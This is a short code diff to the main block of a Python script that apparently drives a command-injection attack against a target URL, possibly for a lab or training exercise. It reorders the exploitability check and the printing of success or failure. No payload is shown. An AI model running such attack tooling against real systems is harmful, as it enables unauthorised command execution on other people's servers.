@@ -55,11 +55,11 @@ if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
         session = requests.Session()
-        if not is_exploitable(url, session):
-            print("[-] Email is not vulnerable to command injection") 
-            sys.exit(FAIL)
-        response = get_command_injection_response(url, session)
-        print("[+] Command Injection Successful. %s" % response)
+        if is_exploitable(url, session):
+            response = get_command_injection_response(url, session)
+            print("[+] Command Injection Successful. %s" % response)
+        else:
+            print("[-] Command Injection Failed.")
     except IndexError:
         print("[-] Usage: %s <url> <user>" % sys.argv[0])
         print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
